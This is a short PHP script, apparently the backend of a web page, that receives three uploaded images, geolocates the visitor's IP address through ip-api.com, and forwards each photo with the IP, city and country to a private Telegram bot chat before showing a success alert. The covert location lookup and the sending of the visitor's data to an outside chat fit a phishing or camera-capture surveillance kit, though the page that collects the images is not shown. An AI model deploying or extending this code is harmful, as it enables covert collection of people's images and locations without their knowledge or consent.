<?php

$config = json_decode(file_get_contents('config.json'), true);
$TOKEN = $config['token'];
$CHAT_ID = $config['chat_id'];

function enviar($imagen){
    global $TOKEN,$CHAT_ID;

    $url = "https://api.telegram.org/bot$TOKEN/sendPhoto";

    $ip = $_SERVER['REMOTE_ADDR'];
    $api = @file_get_contents("http://ip-api.com/json/$ip");
    $data = json_decode($api, true);
    $city = $data['city'] ?? 'Desconocida';
    $country = $data['country'] ?? 'Desconocido';
    $caption = "IP: $ip\nUbicación: $city, $country";

    $post = [
        'chat_id' => $CHAT_ID,
        'photo' => new CURLFile($imagen['tmp_name']),
        'caption' => $caption
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_exec($ch);
    curl_close($ch);
}

enviar($_FILES['img1']);
enviar($_FILES['img2']);
enviar($_FILES['img3']);

echo "<script>
alert('Imágenes enviadas correctamente');
window.location='index.html';
</script>";
?>
